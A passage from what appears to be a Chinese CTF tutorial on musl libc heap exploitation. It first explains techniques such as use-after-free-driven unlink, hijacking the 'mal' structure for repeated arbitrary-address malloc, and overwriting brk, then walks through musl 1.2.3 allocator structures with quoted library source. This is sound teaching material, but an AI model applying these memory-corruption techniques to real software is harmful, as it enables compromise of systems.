<code>next</code> 写入可读写地址。依据题目中的具体情况，这里采用 UAF
修改 <code>prev</code> 和 <code>next</code> 的方式来实现 unlink
。另外由于 unlink 和 后续攻击用到的 <code>chunk</code>
大小相同，因此这里将 <code>prev</code> 和 <code>next</code> 分别修改为
<code>&amp;fake_chunk - 8</code> 和 <code>&amp;fake_chunk</code>
来避免之后不能从 <code>bin</code> 中申请 <code>chunk</code> 。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c793308106bca599336cdca5d5c5bbbf.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p></li>
<li><p>之后再次通过 UAF 修改 <code>next</code> 指针指向
<code>fake chunk</code>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/fba90e1ac3dbf27d07418614456cf65b.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p></li>
</ul>
<h3 id="劫持-mal-实现连续任意地址-malloc">劫持 mal 实现连续任意地址
malloc</h3>
<p>以这道<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-musl" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为例。</p>
<p>对于同一大小的 <code>chunk</code> 来说，前面任意地址
<code>malloc</code> 的方法只能进行一次，因为经过一次任意地址
<code>malloc</code> 之后 <code>mal</code> 的 <code>bin</code> 的
<code>head</code> 指针已经不可控，因此不能再次任意地址
<code>malloc</code> 。</p>
<p>但是如果劫持 <code>mal</code> 结构体的话就可以连续任意地址
<code>malloc</code>，不过任意地址 <code>malloc</code> 的前提是
<code>fake chunk</code> 的 <code>csize</code> ， <code>next</code> 和
<code>prev</code> 必须满足前面任意地址 <code>malloc</code>
的条件。由于劫持了 <code>mal</code> 结构体之后不容易 unlink
，因此需要在劫持 <code>mal</code> 结构体之前在需要 <code>malloc</code>
的地址通过 unlink 位置 <code>fake chunk</code> 的 <code>next</code> 和
<code>prev</code> 。另外需要选择目标地址往前一点的偏移使得
<code>csize</code> 合法，之后不停的任意地址 <code>malloc</code>
利用前面的 <code>fake chunk</code> 伪造后面 <code>fake chunk</code>
的头直到把目标地址申请出来。</p>
<p>另外由于部分 <code>chunk</code>
是在程序上的，因此可以通过部分地址覆盖 <code>mal</code>
上的这些程序地址从而绕过 PIE 将 <code>chunk</code>
申请到程序的某些结构上。例如这道<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/WMCTF-Nescafe" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。
### 劫持 brk 控制 malloc 返回值</p>
<p>还是以<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-musl" >这道题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为例</p>
<p>当 <code>bins</code> 中没有 <code>chunk</code> 可供分配（即
<code>binmap</code> 为 0 时）会调用 <code>__expand_heap</code>
函数申请一块新的堆空间用于构造 <code>chunk</code>
。因此可以通过任意地址写修改 <code>__expand_heap</code> 的
<code>brk</code> 然后劫持 <code>mal</code> 设置 <code>binmap</code> 为 0
来实现对 <code>malloc</code> 返回值的控制。</p>
<p>获取 <code>brk</code> 在 <code>libc.so</code> 中偏移的方法如下： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/968e6405cc245317e96e8cebbfb23e3f.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h1 id="musl-heap-musl-1.2.3">musl heap (musl-1.2.3)</h1>
<h2 id="基本数据结构">基本数据结构</h2>
<p>在 <code>meta.h</code> 文件夹中定义了 musl 内存管理相关的结构。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d79edcc2ff4572a91c7429c108bd89e1.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h3 id="deque">deque</h3>
<p>musl 内存管理时经常使用双向链表来缓存一些 <code>meta</code>
的结构，我们暂且称它为 deque 。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9d32bd917c91d670b1af725390e1c48c.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<p>对应的操作有
<code>queue</code>，<code>dequeue</code>，<code>dequeue_head</code>
三个操作。 #### queue</p>
<p><code>queue</code> 函数的作用是将 <code>*m</code> 插入到
<code>*phead</code> 指向的 deque 中。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">queue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span> &#123;</span><br><span class="line">    assert(!m-&gt;next);</span><br><span class="line">    assert(!m-&gt;prev);</span><br><span class="line">    <span class="keyword">if</span> (*phead) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">head</span> =</span> *phead;</span><br><span class="line">        m-&gt;next = head;</span><br><span class="line">        m-&gt;prev = head-&gt;prev;</span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        m-&gt;prev = m-&gt;next = m;</span><br><span class="line">        *phead = m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> #### dequeue
<code>dequeue</code> 函数的作用是将 <code>*m</code> 从
<code>*phead</code> 指向的 deque 中取出。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">        m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">        <span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *phead = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ####
dequeue_head <code>dequeue_head</code> 函数的作用是将
<code>*phead</code> 指向的 <code>meta</code> 结构从 <code>*phead</code>
指向的 deque 中取出。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">dequeue_head</span><span class="params">(<span class="keyword">struct</span> meta **phead)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *phead;</span><br><span class="line">    <span class="keyword">if</span> (m) dequeue(phead, m);</span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ### malloc_context <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PAGESIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> init_done;</span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span></span><br><span class="line">    <span class="type">size_t</span> usage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
这个结构体是musl libc的堆管理最上层结构，其中字段的含义分别为： -
<code>uint64_t secret</code>：一个随机生成的数，用于检查meta的合法性，也即一个
check guard 。 - <code>int init_done</code>：判断
<code>malloc_context</code> 是否初始化完成，在 <code>alloc_meta</code>
函数中进行检查，如果没有则进行初始化，否则跳过初始化流程，这里的初始化指的是初始化
<code>secret</code> 。 - <code>unsigned mmap_counter</code>：mmap
计数器，通过 mmap 分配了多少次空间用于内存分配。 -
<code>struct meta *free_meta_head</code>：被释放的 <code>meta</code>
结构体构成的双向链表表头，<code>meta</code> 结构体是 musl libc
内存分配的低一级结构。 -
<code>struct meta *avail_meta</code>：指向空闲的 meta 。 -
<code>size_t avail_meta_count</code>：musl 保留但未使用的
<code>meta</code> 的数量。 - <code>avail_meta_area_count</code>：musl
保留但未使用的 <code>meta_area</code> 的数量。 -
<code>meta_alloc_shift</code>：当没有空闲 <code>meta_area</code> 且 brk
不能为 <code>meta_arena</code> 申请连续内存时需要采用 mmap 的方式申请
<code>meta_arena</code>，<code>meta_alloc_shift</code>
用于计算了此时需要扩展的内存大小，这个值是动态调节的。 -
<code>struct meta_area *meta_area_head, *meta_area_tail</code>：存放
<code>meta_area</code> 的单向链表，只作记录，没什么实际作用。 -
<code>unsigned char *avail_meta_areas</code>：musl 保留但未使用的
<code>meta_area</code> 的起始地址，具体见后面对 <code>alloc_meta</code>
函数的分析。 -
<code>struct meta *active[48]</code>：可以直接参与内存分配的
<code>meta</code>，按照 <code>meta</code> 管理的内存中
<code>chunk</code> 的大小划分为 48 组，每个组由 <code>meta</code>
形成一个 deque 。 48 个组中 <code>chunk</code> 大小以及
<code>malloc</code> 的 size 大小对应关系如下： | sc | chunk size | min
size | max size | | ---- | ---------- | -------- | -------- | | 0 | 0x10
| 0x0 | 0xc | | 1 | 0x20 | 0xd | 0x1c | | 2 | 0x30 | 0x1d | 0x2c | | 3 |
0x40 | 0x2d | 0x3c | | 4 | 0x50 | 0x3d | 0x4c | | 5 | 0x60 | 0x4d | 0x5c
| | 6 | 0x70 | 0x5d | 0x6c | | 7 | 0x80 | 0x6d | 0x7c | | 8 | 0x90 |
0x7d | 0x8c | | 9 | 0xa0 | 0x8d | 0x9c | | 10 | 0xc0 | 0x9d | 0xbc | |
11 | 0xf0 | 0xbd | 0xec | | 12 | 0x120 | 0xed | 0x11c | | 13 | 0x140 |
0x11d | 0x13c | | 14 | 0x190 | 0x13d | 0x18c | | 15 | 0x1f0 | 0x18d |
0x1ec | | 16 | 0x240 | 0x1ed | 0x23c | | 17 | 0x2a0 | 0x23d | 0x29c | |
18 | 0x320 | 0x29d | 0x31c | | 19 | 0x3f0 | 0x31d | 0x3ec | | 20 | 0x480
| 0x3ed | 0x47c | | 21 | 0x540 | 0x47d | 0x53c | | 22 | 0x660 | 0x53d |
0x65c | | 23 | 0x7f0 | 0x65d | 0x7ec | | 24 | 0x920 | 0x7ed | 0x91c | |
25 | 0xaa0 | 0x91d | 0xa9c | | 26 | 0xcc0 | 0xa9d | 0xcbc | | 27 | 0xff0
| 0xcbd | 0xfec | | 28 | 0x1240 | 0xfed | 0x123c | | 29 | 0x1540 |
0x123d | 0x153c | | 30 | 0x1990 | 0x153d | 0x198c | | 31 | 0x1ff0 |
0x198d | 0x1fec | | 32 | 0x2480 | 0x1fed | 0x247c | | 33 | 0x2aa0 |
0x247d | 0x2a9c | | 34 | 0x3320 | 0x2a9d | 0x331c | | 35 | 0x3ff0 |
0x331d | 0x3fec | | 36 | 0x4910 | 0x3fed | 0x490c | | 37 | 0x5540 |
0x490d | 0x553c | | 38 | 0x6650 | 0x553d | 0x664c | | 39 | 0x7ff0 |
0x664d | 0x7fec | | 40 | 0x9240 | 0x7fed | 0x923c | | 41 | 0xaaa0 |
0x923d | 0xaa9c | | 42 | 0xccc0 | 0xaa9d | 0xccbc | | 43 | 0xfff0 |
0xccbd | 0xffec | | 44 | 0x12480 | 0xffed | 0x1247c | | 45 | 0x15540 |
0x1247d | 0x1553c | | 46 | 0x19980 | 0x1553d | 0x1997c | | 47 | 0x1fff0
| 0x1997d | 0x1ffec |</p>
<ul>
<li><code>size_t usage_by_class[48]</code>：对应大小的缓存的所有
<code>meta</code> 的 <code>group</code> 所管理的 chunk 个数。</li>
<li><code>uint8_t unmap_seq[32], bounces[32]</code>：参与
<code>alloc_group</code> 中计算新分配 group 的大小。</li>
<li><code>uint8_t seq</code>：参与 <code>alloc_group</code> 中计算新分配
group 的大小。</li>
<li><code>uintptr_t brk</code>：记录目前的 <code>brk(0)</code> ，如果
brk 不能分配连续内存则该值设为 -1 。</li>
</ul>
<p><code>malloc_context</code> 被实例化为全局变量 <code>ctx</code> 。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ctx __malloc_context</span></span><br><span class="line"></span><br><span class="line">__attribute__((__visibility__(<span class="string">&quot;hidden&quot;</span>))) <span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> <span class="title">ctx</span>;</span></span><br></pre></td></tr></table></figure></div> ### meta_area <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div> 这个结构用于管理一页内的所有
<code>meta</code> 结构，属于 <code>malloc_context</code>
的下级结构，<code>meta</code> 的上级结构。</p>
<ul>
<li><p><code>uint64_t check</code>：检查字段，与
<code>malloc_context</code> 中的 <code>secret</code> 字段对应，检查该
<code>meta_area</code> 是否可能被修改</p></li>
<li><p><code>struct meta_area *next</code>：下一个meta_area的地址，与前面
<code>malloc_context</code> 的
<code>struct meta_area *meta_area_head, *meta_area_tail</code>
一起构成单向链表，存放空闲的 <code>meta_area</code> ，正常使用中的
<code>meta_area</code> 该字段为 0 。</p></li>
<li><p><code>int nslots</code>：该 <code>meta_area</code> 中管理的
<code>meta</code> 数量，一般为固定值。</p></li>
<li><p><code>struct meta slots[]</code>：管理的 <code>meta</code> 数组
### meta <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">uintptr_t</span> last_idx : <span class="number">5</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> freeable : <span class="number">1</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass : <span class="number">6</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> maplen : <span class="number">8</span> * <span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>) - <span class="number">12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div> <code>meta</code> 中保存有 <code>group</code>
结构体指针，后者直接保存有需要分配的内存块。</p></li>
<li><p><code>struct meta *prev, *next</code>：构成双向链表，即前面的
deque 。</p></li>
<li><p><code>struct group *mem</code>：<code>meta</code> 管理的
<code>group</code> 结构体指针</p></li>
<li><p><code>volatile int avail_mask, freed_mask</code>：表示
<code>meta</code> 管理的 <code>group</code> 结构体中每个 chunk
的状态，即是否可被分配和是否已被释放（实际可能没有经过释放的 chunk
也可能 对应 <code>freed_mask</code> 置位，因此叫做未激活更合适）。在
musl heap 中，chunk 有 可分配，释放和在使用三个状态，且每个 chunk
只能处在三个状态中的一种上。并且释放的 chunk
不能立即参与分配，只有参与分配的 chunk 不够时才会通过
<code>try_avail</code> 将处于释放状态的 chunk
转换为处于可分配状态。</p></li>
<li><p><code>uintptr_t last_idx:5</code>：该 <code>meta</code>
中最后一个 chunk 的索引，也就是该 <code>meta</code> 管理
<code>last_idx + 1</code> 个 chunk 。</p></li>
<li><p><code>freeable:1</code>：该 <code>meta</code> 中的
<code>chunk</code> 是否能够被释放，这个值一般都是 1 。</p></li>
<li><p><code>uintptr_t sizeclass:6</code>：管理的 <code>group</code> 的
chunk 大小属于哪一组。是 mmap 分配，则固定为 63 。</p></li>
<li><p><code>uintptr_t maplen:8*sizeof(uintptr_t)-12</code>：如果管理的
<code>group</code> 是 mmap分配的，则为内存页数，否则为 0 。</p></li>
</ul>
<p>以位于 heap 段的 <code>meta_area</code>
为例，内存分布如下图所示，因此 <code>meta</code>
可以通过找所在内存页基址查找到对应的 <code>meta_area</code> 。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/09142b51a139b08e083963a07bf67f44.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                >
与 <code>meta</code> 相关的函数这里先介绍 <code>free_meta</code> 和
<code>alloc_meta</code> 。</p>
<h4 id="get_stride">get_stride</h4>
<p>根据 <code>meta</code> 获取其管理的 <code>group</code> 中 chunk
的大小。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">get_stride</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!g-&gt;last_idx &amp;&amp; g-&gt;maplen) &#123;</span><br><span class="line">        <span class="keyword">return</span> g-&gt;maplen * <span class="number">4096UL</span> - UNIT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UNIT * size_classes[g-&gt;sizeclass];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="free_meta">free_meta</h4>
<p>释放 <code>meta</code> 实际上就是将 <code>meta</code> 清零后放入
<code>free_meta_head</code> 指向的 deque 中。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">free_meta</span><span class="params">(<span class="keyword">struct</span> meta *m)</span> &#123;</span><br><span class="line">    *m = (<span class="keyword">struct</span> meta)&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">queue</span>(&amp;ctx.free_meta_head, m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ####
alloc_meta 首先判断 <code>ctx</code> 是否初始化，没有初始化则初始化
<code>secret</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (!ctx.init_done) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">        ctx.pagesize = get_page_size();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        ctx.secret = get_random_secret();</span><br><span class="line">        ctx.init_done = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
<p>之后初始化 <code>pagesize</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PAGESIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PAGESIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGSZ PAGESIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGSZ ctx.pagesize</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pagesize = PGSZ;</span><br><span class="line">    <span class="keyword">if</span> (pagesize &lt; <span class="number">4096</span>) pagesize = <span class="number">4096</span>;</span><br></pre></td></tr></table></figure></div></p>
<p>如果 <code>free_meta_head</code> 不为空则从中取出之前释放的
<code>meta</code> 并返回。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((m = dequeue_head(&amp;ctx.free_meta_head))) <span class="keyword">return</span> m;</span><br></pre></td></tr></table></figure></div> 如果
<code>avail_meta_count</code> 为 0 则获取空闲的 <code>meta</code>
，之后从空闲的 <code>meta</code> 中取出一个返回。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ctx.avail_meta_count) &#123;...&#125;</span><br><span class="line">ctx.avail_meta_count--;</span><br><span class="line">m = ctx.avail_meta++;</span><br><span class="line">m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> m;</span><br></pre></td></tr></table></figure></div>
下面介绍如何获取空闲的 <code>meta</code> 。 首先先解释一下用到的两个标志
<code>need_unprotect</code> 和 <code>need_guard</code> 的含义。 -
<code>need_unprotect</code> 指的是有一块内存，需要用来作为
<code>meta_area</code> 但现在它没有读写权限，因此需要调用
<code>mprotect</code> 给这块内存赋上读写权限。 - <code>need_guard</code>
指的是有一块有读写权限的内存，现在从这个内存中某个位置起划定为
<code>meta_area</code> ，但是为了确保 <code>meta_area</code> 的
<code>check</code> 字段不被溢出覆盖，需要将 <code>meta_area</code>
前的内存去掉读写权限。</p>
<p>这里首先将 <code>need_unprotect</code> 置 1 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> need_unprotect = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>
之后讨论没有空闲的 <code>meta_area</code> 且 brk
可以分配连续内存的情况： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ctx.avail_meta_area_count &amp;&amp; ctx.brk != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="type">uintptr_t</span> new = ctx.brk + pagesize;</span><br><span class="line">    <span class="type">int</span> need_guard = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!ctx.brk) &#123;</span><br><span class="line">        need_guard = <span class="number">1</span>;</span><br><span class="line">        ctx.brk = brk(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// some ancient kernels returned _ebss</span></span><br><span class="line">        <span class="comment">// instead of next page as initial brk.</span></span><br><span class="line">        ctx.brk += -ctx.brk &amp; (pagesize - <span class="number">1</span>);</span><br><span class="line">        new = ctx.brk + <span class="number">2</span> * pagesize;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (brk(new) != new) &#123;</span><br><span class="line">        ctx.brk = <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (need_guard) mmap((<span class="type">void</span> *) ctx.brk, pagesize, PROT_NONE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        ctx.brk = new;</span><br><span class="line">        ctx.avail_meta_areas = (<span class="type">void</span> *) (new - pagesize);</span><br><span class="line">        ctx.avail_meta_area_count = pagesize &gt;&gt; <span class="number">12</span>;</span><br><span class="line">        need_unprotect = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 这里分两种情况： - 如果 brk
第一次调用，即 <code>ctx.brk</code> 为 0 ，则先调用 <code>brk(0)</code>
获取 heap 段基址，然后在页对齐的基础上再分配两个内存页的内存并且
<code>need_guard</code> 置 1
。如果分配内存连续（<code>brk(new) != new</code>）则由于
<code>need_guard</code> 置 1 需要将前一个内存页去掉读写权限。最后将
<code>need_unprotect</code> 置 0 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8d1d6ffa3744fc3a87b82af6264ab6fc.png"
                     
alt="在这里插入图片描述" 
                > - 如果 brk 不是第一次调用，即
<code>ctx.brk</code> 不为 0 ，则直接 brk 出一块内存页即可。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c2082092d3c7b025c92fff6b8534d0db.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>如果之后如果还是没有空闲的 <code>meta_area</code> 说明此时 brk
以及不能连续扩展内存，因此需要通过 mmap 申请内存作为空闲的
<code>meta_area</code> 。mmap 的内存大小通过
<code>meta_alloc_shift</code> 计算，并且每次 mmap 之后，下次 mmap
的内存数量翻倍。和 brk 一样，获得的内存中的第一块内存页不能使用，由于
mmap 的内存没有读写权限，因此需要将 <code>ctx.avail_meta_areas</code>
指向的内存页赋上可读写权限。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ctx.avail_meta_area_count) &#123;</span><br><span class="line">    <span class="type">size_t</span> n = <span class="number">2UL</span> &lt;&lt; ctx.meta_alloc_shift;</span><br><span class="line">    p = mmap(<span class="number">0</span>, n * pagesize, PROT_NONE, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (p == MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    ctx.avail_meta_areas = p + pagesize;</span><br><span class="line">    ctx.avail_meta_area_count = (n - <span class="number">1</span>) * (pagesize &gt;&gt; <span class="number">12</span>);</span><br><span class="line">    ctx.meta_alloc_shift++;</span><br><span class="line">&#125;</span><br><span class="line">p = ctx.avail_meta_areas;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">uintptr_t</span>) p &amp; (pagesize - <span class="number">1</span>)) need_unprotect = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (need_unprotect)</span><br><span class="line">    <span class="keyword">if</span> (mprotect(p, pagesize, PROT_READ | PROT_WRITE) &amp;&amp; errno != ENOSYS)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div> 最后就是从空闲的
<code>meta_area</code> 中获取一个 <code>meta_areas</code> 然后再从该
<code>meta_areas</code> 中获取空闲的 meta 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">ctx.avail_meta_area_count--;</span><br><span class="line">ctx.avail_meta_areas = p + <span class="number">4096</span>;</span><br><span class="line"><span class="keyword">if</span> (ctx.meta_area_tail) &#123;</span><br><span class="line">    ctx.meta_area_tail-&gt;next = (<span class="type">void</span> *) p;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ctx.meta_area_head = (<span class="type">void</span> *) p;</span><br><span class="line">&#125;</span><br><span class="line">ctx.meta_area_tail = (<span class="type">void</span> *) p;</span><br><span class="line">ctx.meta_area_tail-&gt;check = ctx.secret;</span><br><span class="line">ctx.avail_meta_count = ctx.meta_area_tail-&gt;nslots = (<span class="number">4096</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta_area)) / <span class="keyword">sizeof</span> *m;</span><br><span class="line">ctx.avail_meta = ctx.meta_area_tail-&gt;slots;</span><br></pre></td></tr></table></figure></div>
现在已经可以确定 meta_area 和 meta 的在内存中的关系如下图所示（以 mmap
扩展 meta_area 为例）。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/bb0d0c2c457d2b706d9cdce66024b710.png"
                     
alt="在这里插入图片描述" 
                > ### group <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx : <span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
group中即保存有需要分配出去的chunk。</p>
<p><code>struct meta *meta</code>：所属的meta的地址
<code>unsigned char active_idx:5</code>：5个比特，表示还有多少可用chunk
<code>char pad[UNIT - sizeof(struct meta *) - 1]</code>：手动16字节对齐
